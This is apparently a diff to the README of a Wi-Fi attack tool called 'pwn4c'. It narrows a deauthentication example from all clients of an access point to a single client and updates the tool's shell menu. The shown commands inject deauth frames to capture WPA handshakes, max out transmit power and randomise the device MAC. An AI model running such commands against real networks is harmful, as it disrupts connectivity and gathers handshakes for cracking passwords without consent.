@@ -106,11 +106,11 @@ pwn4c monitor --hop --channels 1,6,11 --dwell 250 -o - | wireshark -k -i -
 ### 5. RF Attacks & Hardware Configuration
 
 ```bash
-# Deauth all clients of an AP and capture the reconnection handshakes in one session
-pwn4c deauth -b AA:BB:CC:DD:EE:FF -i 6 --monitor -o handshake.pcap
+# Deauth one client and capture the reconnection handshake in one session
+pwn4c deauth -b AA:BB:CC:DD:EE:FF -c 12:22:33:44:55:66 -i 6 --monitor --filter-bssid AA:BB:CC:DD:EE:FF -o handshake.pcap
 
 # Inject 20 deauth frames against target AP client with 10ms pacing
-pwn4c deauth -b AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 -i 6 -n 20 --interval 10
+pwn4c deauth -b AA:BB:CC:DD:EE:FF -c 12:22:33:44:55:66 -i 6 -n 20 --interval 10
 
 # Maximize TX power and randomize drone MAC
 pwn4c config --power 20 --mac random
@@ -136,7 +136,7 @@ pwn4c upgrade --image pwn4c-firmware-mi4c-sysupgrade.bin
 pwn4c shell
 #   2) networks   -> survey
 #   3) use 1      -> pick a target network
-#   8) deauth     -> burst + automatic handshake capture
+#   8) deauth     -> burst + capture (asks for the client MAC)
 #   q) quit
 ```
 
